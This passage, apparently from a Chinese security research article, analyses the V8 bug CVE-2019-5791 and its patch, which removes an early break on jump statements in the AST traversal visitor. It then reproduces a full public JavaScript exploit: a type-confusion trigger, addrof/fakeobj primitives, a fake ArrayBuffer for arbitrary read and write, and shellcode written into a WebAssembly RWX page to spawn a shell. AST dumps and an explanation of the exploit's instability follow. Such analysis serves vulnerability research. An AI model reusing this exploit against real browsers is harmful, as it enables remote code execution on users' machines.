#### patch分析
我们回过头来看patch修改的内容，去掉了ast
visitor中对代码块跳转的判断，即不论当前代码块是否会跳转依旧处理之后的代码，这样虽然可能会多遍历检查一部分语法树结点，但确实是修复了这个漏洞。
    diff --git a/src/ast/ast-traversal-visitor.h b/src/ast/ast-traversal-visitor.h
    index ac5f8f2f6..b4836ff 100644
    --- a/src/ast/ast-traversal-visitor.h
    +++ b/src/ast/ast-traversal-visitor.h
    @@ -116,7 +116,6 @@
       for (int i = 0; i length(); ++i) {
         Statement* stmt = stmts->at(i);
         RECURSE(Visit(stmt));
    -    if (stmt->IsJump()) break;
       }
     }
    diff --git a/src/ast/ast.cc b/src/ast/ast.cc
    index d47300a..c5b122c 100644
    --- a/src/ast/ast.cc
    +++ b/src/ast/ast.cc
    @@ -151,26 +151,6 @@
       return IsFunctionLiteral() && IsAccessorFunction(AsFunctionLiteral()->kind());
     }
    -bool Statement::IsJump() const {
    -  switch (node_type()) {
    -#define JUMP_NODE_LIST(V) \
    -  V(Block)                \
    -  V(ExpressionStatement)  \
    -  V(ContinueStatement)    \
    -  V(BreakStatement)       \
    -  V(ReturnStatement)      \
    -  V(IfStatement)
    -#define GENERATE_CASE(Node) \
    -  case k##Node:             \
    -    return static_cast(this)->IsJump();
    -    JUMP_NODE_LIST(GENERATE_CASE)
    -#undef GENERATE_CASE
    -#undef JUMP_NODE_LIST
    -    default:
    -      return false;
    -  }
    -}
    -
### 漏洞利用
cve-2019-5791网上只有一个公开的韩国人写的不稳定exp，成功率大概在40%左右，exp地址：。作者水平有限没有构造出比较稳定的exp，下面介绍这个exp的思路。
因为我们利用cve-2019-5791最终要达到的目的还是任意地址读写，所以要做的就是利用if死结点之后代码的类型混淆构造一个可控的array
buffer对象，有了可控的array buffer利用写wasm执行shellcode即可。
    callFn = function(code) {
        try {
            code();
        } catch (e) {
            console.log(e);
        }
    }
    let proxy = new Proxy({}, {});
    function run(prop, ...args) {
        let handler = {};
        const proxy = new Proxy(function() {}, handler);
        handler[prop] = (({
            v1 = ((v2 = (function() {
                var v3 = 0;
                var callFn = 0;
                if (asdf) {
                    return;
                } else {
                    return;
                }
                (function() {
                    v3();
                });
                (function() {
                    callFn = "\u0041".repeat(1024 * 32); // mutate "run"
                    v3 = [1.1, 2.2, 3.3]; // now "proxy" becomes a packed array.
                    v4 = [{}].slice();
                    v5 = [4.4];
                })
            })) => (1))()
        }, ...args) => (1));
        Reflect[prop](proxy, ...args);
    }
    callFn((() => (run("construct", []))));
    callFn((() => (run("prop1"))));
    function test() {
        let convert = new ArrayBuffer(0x8);
        let f64 = new Float64Array(convert);
        let u32 = new Uint32Array(convert);
        function d2u(v) {
            f64[0] = v;
            return u32;
        }
        function u2d(lo, hi) {
            u32[0] = lo;
            u32[1] = hi;
            return f64[0];
        }
        function hex(d) {
            let val = d2u(d);
            return ("0x" + (val[1] * 0x100000000 + val[0]).toString(16));
        }
        let shellcode = [0x6a6848b8, 0x2f62696e, 0x2f2f2f73, 0x504889e7, 0x68726901, 0x1813424, 0x1010101, 0x31f656be, 0x1010101, 0x81f60901, 0x1014801, 0xe6564889, 0xe631d2b8, 0x01010101, 0x353a0101, 0x01900f05];
        let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
        let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
        let f = wasm_mod.exports._Z3addii;
        run[18] = 0x41414141;
        if(proxy.length == 0x41414141){
        print("exploit success!\n");
    }
        else{
        print("exploit fail TT\n");
    }
        let addrof = function(obj) {
            v4[0] = obj;
            var leak = proxy[26];
            return leak;
        }
        let fakeobj = function(addr) {
            proxy[26] = addr;
            var obj = v4[0];
            return obj;
        }
        let ab = new ArrayBuffer(0x100);
        let abAddr = addrof(ab);
        print("array buffer : " + hex(abAddr));
        let wasmObj = addrof(f) - u2d(0x108, 0);
        doubleMap = proxy[34];
        var fake = [
            doubleMap, 0,
            wasmObj, u2d(0, 0x8)
        ].slice();
        var fakeAddr = addrof(fake) - u2d(0x20, 0);
        print("fake_addr : " + hex(fakeAddr));
        var target = fakeobj(fakeAddr);
        let rwx = target[0];
        print("rwx : " + hex(rwx));
        fake[2] = abAddr + u2d(0x10, 0);
        target[0] = rwx;
        let dv = new DataView(ab);
        for (var i = 0; i < shellcode.length; i++) {
            dv.setUint32(i * 4, shellcode[i]);
        }
        f();
    }
    test();
`--print-ast`查看一下exp中生成的语法树
    ......
    [generating bytecode for function: run]
    --- AST ---    FUNC at 122
    . KIND 0
    . SUSPEND COUNT 0
    . NAME "run"
    . PARAMS
    . . VAR (0x55f76877bc10) (mode = TEMPORARY, assigned = true) ""
    . DECLS
    . . VARIABLE (0x55f76877bb18) (mode = LET, assigned = false) "prop"
    . . VARIABLE (0x55f76877bbc0) (mode = LET, assigned = false) "args"
    . BLOCK NOCOMPLETIONS at -1
    . . EXPRESSION STATEMENT at -1
    . . . INIT at -1
    . . . . VAR PROXY local[0] (0x55f76877bb18) (mode = LET, assigned = false) "prop"
    . . . . VAR PROXY parameter[0] (0x55f76877bc10) (mode = TEMPORARY, assigned = true) ""
    . . EXPRESSION STATEMENT at -1
    . . . INIT at -1
    . . . . VAR PROXY local[1] (0x55f76877bbc0) (mode = LET, assigned = false) "args"
    . . . . VAR PROXY local[2] (0x55f76877bc40) (mode = TEMPORARY, assigned = true) ""
    . BLOCK NOCOMPLETIONS at -1
    . . BLOCK NOCOMPLETIONS at -1
    . . . EXPRESSION STATEMENT at 156
    . . . . INIT at 156
    . . . . . VAR PROXY local[3] (0x55f76877bf40) (mode = LET, assigned = false) "handler"
    . . . . . OBJ LITERAL at 156
    . . BLOCK NOCOMPLETIONS at -1
    . . . EXPRESSION STATEMENT at 176
    . . . . INIT at 176
    . . . . . VAR PROXY local[4] (0x55f76877c100) (mode = CONST, assigned = false) "proxy"
    . . . . . CALL NEW at 176
    . . . . . . VAR PROXY unallocated (0x55f7687838b8) (mode = DYNAMIC_GLOBAL, assigned = false) "Proxy"
    . . . . . . FUNC LITERAL at 186
    . . . . . . . NAME 
    . . . . . . . INFERRED NAME 
    . . . . . . VAR PROXY local[3] (0x55f76877bf40) (mode = LET, assigned = false) "handler"
    .......
    [generating bytecode for function: v1.v2]
    --- AST ---    FUNC at 373
    . KIND 0
    . SUSPEND COUNT 0
    . NAME ""
    . INFERRED NAME "v1.v2"
    . EXPRESSION STATEMENT at 393
    . . ASSIGN at 400
    . . . VAR PROXY context[5] (0x55f768781158) (mode = VAR, assigned = true) "callFn"  0x55f7687838b8
    . . . CALL
    . . . . PROPERTY at 411
    . . . . . LITERAL "A"
    . . . . . NAME repeat
    . . . . LITERAL 32768
    . EXPRESSION STATEMENT at 434
    . . ASSIGN at 437
    . . . VAR PROXY context[4] (0x55f768781070) (mode = VAR, assigned = true) "v3"      
    . . . ARRAY LITERAL at 439
    . . . . VALUES at 439
    . . . . . LITERAL 1
    . . . . . LITERAL 2
    . . . . . LITERAL 3
    . . . . . LITERAL 4
    . . . . . LITERAL 5
    . . . . . LITERAL 6
注意到run中proxy对象的地址是`0x55f76877c100`，v1.v2中callFn的地址是`0x55f7687838b8`，callFn中的元素会覆盖到proxy的位置导致proxy和run类型混淆成array。在run成功被混淆成array类型时我们可以通过run修改proxy的长度得到一个可以越界访问的数组proxy，再通过数组的越界读写利用写wasm执行shellcode即可。这里exp不稳定的原因是run不一定会从jsfunction类型被稳定类型混淆成array类型，导致不一定会得到稳定越界访问的数组proxy。
### 总结
通过以上分析发现cve-2019-5791这个漏洞根源还是v8在开发时模块之间耦合出现的问题，而为了减少模块之间数据和操作的耦合度，又不得不加入一些模块去分开处理数据和操作。模块之间耦合时可能存在处理不一致导致安全隐患，这可能为我们挖掘漏洞提供了新的思路。
* * *